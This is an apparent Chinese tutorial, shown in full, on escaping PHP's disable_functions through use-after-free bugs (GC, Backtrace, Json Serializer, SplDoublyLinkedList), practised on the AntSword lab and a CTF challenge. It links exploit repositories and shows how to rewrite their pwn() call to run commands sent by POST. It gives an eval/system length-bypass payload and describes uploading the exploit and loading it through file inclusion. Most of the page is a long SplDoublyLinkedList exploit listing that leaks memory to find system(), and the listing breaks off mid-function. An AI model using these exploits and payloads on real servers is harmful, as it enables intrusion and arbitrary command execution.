<h3 id="利用-GC-UAF"><a href="#利用-GC-UAF" class="headerlink" title="利用 GC UAF"></a><strong>利用 GC UAF</strong></h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><ul>
<li>Linux 操作系统</li>
<li>PHP7.0 - all versions to date</li>
<li>PHP7.1 - all versions to date</li>
<li>PHP7.2 - all versions to date</li>
<li>PHP7.3 - all versions to date</li>
</ul>
<p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>此漏洞利用 PHP 垃圾收集器中存在三年的一个 <a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">bug</a> ，通过PHP垃圾收集器中<strong>堆溢出</strong>来绕过 disable_functions 并执行系统命令</p>
<p><strong>攻击</strong></p>
<p>还是蚁剑的靶场，打开蚁剑</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009144749904.png" alt="img"></p>
<p>点击开始会跳出来一个新的终端</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009144820119.png" alt="img"></p>
<p>来看看exp的使用</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009145242413.png" alt="img"></p>
<p>在exp里面有一个pwn，里面放着我们想要执行的命令，当然一个个换肯定麻烦，可以修改为</p>
<pre><code>pwn("$_POST[cmd]");  </code></pre><p>就可以以POST的形式传递了</p>
<h3 id="利用-Backtrace-UAF"><a href="#利用-Backtrace-UAF" class="headerlink" title="利用 Backtrace UAF"></a><strong>利用 Backtrace UAF</strong></h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>Linux 操作系统</li>
<li>PHP7.0 - all versions to date</li>
<li>PHP7.1 - all versions to date</li>
<li>PHP7.2 - all versions to date</li>
<li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li>
<li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li>
</ul>
<p>原理：该漏洞利用在debug_backtrace()函数中使用了两年的一个 <a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p>
<p>exp：<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p>
<p>这个脚本跟上面的GC一样，也是修改pwn的位置</p>
<p>利用方式相同，有可以上传执行并且能访问的目录，就直接上传，不行就，上传到tmp目录或者别的能上传的，然后利用文件包含</p>
<pre><code>include("/tmp/xxx.php");&amp;cmd=xxx</code></pre><h3 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a><strong>Json Serializer UAF</strong></h3><h4 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a><strong>使用条件：</strong></h4><ul>
<li><p>Linux 操作系统</p>
</li>
<li><p>PHP 版本</p>
</li>
<li><ul>
<li>7.1 - all versions to date</li>
<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
</ul>
</li>
</ul>
<p>原理：</p>
<p>此漏洞利用json序列化程序中的释放后使用<a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener">漏洞</a>，利用json序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令。尽管不能保证成功，但它应该相当可靠的在所有服务器 api上使用</p>
<p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<p>同样的方式修改exp</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009150502762.png" alt="img"></p>
<p>修改</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009150608392.png" alt="img"></p>
<p>上传</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151002843.png" alt="img"></p>
<p>或者用蚁剑自带的</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151054097.png" alt="img"></p>
<p>执行</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151106742.png" alt="img"></p>
<h3 id="利用-SplDoublyLinkedList-UAC"><a href="#利用-SplDoublyLinkedList-UAC" class="headerlink" title="利用 SplDoublyLinkedList UAC"></a><strong>利用 SplDoublyLinkedList UAC</strong></h3><h4 id="使用条件：-1"><a href="#使用条件：-1" class="headerlink" title="使用条件："></a><strong>使用条件：</strong></h4><ul>
<li><p>PHP 版本</p>
</li>
<li><ul>
<li>PHP v7.4.10及其之前版本</li>
<li>PHP v8.0（Alpha）</li>
</ul>
</li>
</ul>
<p>详细介绍：<a href="https://www.freebuf.com/articles/web/251017.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/251017.html</a></p>
<p>原理：</p>
<p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等</p>
<p>这里用了<a href="http://bmzclub.cn/" target="_blank" rel="noopener">bmzclub</a>的ezphp来进行实验</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009155419275.png" alt="img"></p>
<p>传入的命令不能超过25</p>
<p>先查看一下phpinfo看看disable_functions</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009155643262.png" alt="img"></p>
<p>可以看到禁用了很多</p>
<p>但是有一个姿势可以绕过长度的限制</p>
<pre><code>a=eval($_POST[1]);1=system('ls')</code></pre><p>但是这里限制了不能利用，所以就需要绕过disable_functions</p>
<p>连接蚁剑</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009160914089.png" alt="img"></p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009160932156.png" alt="img"></p>
<p>终端执行</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175308700.png" alt="img"></p>
<p><a href="https://xz.aliyun.com/t/8355#toc-3" target="_blank" rel="noopener">exp</a></p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175854506.png" alt="img"></p>
<p>脚本的这个位置时间修改flag的</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">120</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$x</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token variable">$i</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token variable">$result</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>

     <span class="token variable">$result</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$address</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">getPHPChunk</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /'</span><span class="token punctuation">;</span>

  <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$end</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0x200000</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$length</span> <span class="token operator">&lt;=</span> <span class="token number">0x300000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

       <span class="token keyword">echo</span> <span class="token string">"[+]PHP Chunk: "</span> <span class="token punctuation">.</span> <span class="token variable">$start</span> <span class="token punctuation">.</span> <span class="token string">" - "</span> <span class="token punctuation">.</span> <span class="token variable">$end</span> <span class="token punctuation">.</span> <span class="token string">", length: 0x"</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

       <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>

   <span class="token punctuation">}</span>

 <span class="token punctuation">}</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">bomb1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x5454545454545454</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x7ffff0000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Where is here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">bomb2</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">0x200000</span><span class="token punctuation">,</span> <span class="token number">0x200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Not Found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token number">0x108</span> <span class="token operator">+</span> <span class="token variable">$address</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$x</span> <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>

     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x1234567812345678</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

         <span class="token keyword">echo</span> <span class="token string">"[+]SplDoublyLinkedList Element: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

         <span class="token keyword">return</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">;</span>

      <span class="token punctuation">}</span>

   <span class="token punctuation">}</span>

 <span class="token punctuation">}</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">getClosureChunk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">do</span> <span class="token punctuation">{</span>

     <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Chunk: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">getSystem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$address</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffffff0000</span><span class="token punctuation">;</span>

  <span class="token variable">$lowestAddr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$address</span> <span class="token operator">&amp;</span> <span class="token number">0x0000fffffff00000</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x0000000001000000</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">;</span>

     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token keyword">break</span><span class="token punctuation">;</span>

   <span class="token punctuation">}</span>

     <span class="token variable">$nameAddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nameAddr</span> <span class="token operator">></span> <span class="token variable">$address</span> <span class="token operator">||</span> <span class="token variable">$nameAddr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token keyword">continue</span><span class="token punctuation">;</span>

   <span class="token punctuation">}</span>

     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$nameAddr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_pad</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token constant">STR_PAD_LEFT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">===</span> <span class="token string">"system"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token punctuation">}</span>

 <span class="token punctuation">}</span>

<span class="token punctuation">}</span>



<span class="token keyword">class</span> <span class="token class-name">Trigger</span> <span class="token punctuation">{</span>

  <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>

     <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]UAF Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token punctuation">}</span>

     <span class="token variable">$maps</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$maps</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token function">cantRead</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>

       <span class="token function">canRead</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token punctuation">}</span>

     <span class="token keyword">echo</span> <span class="token string">"[+]Done"</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$closureChunkAddress</span> <span class="token operator">=</span> <span class="token function">getClosureChunk</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$elementAddress</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get Closure Chunk Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token variable">$closure_object</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closureChunkAddress</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

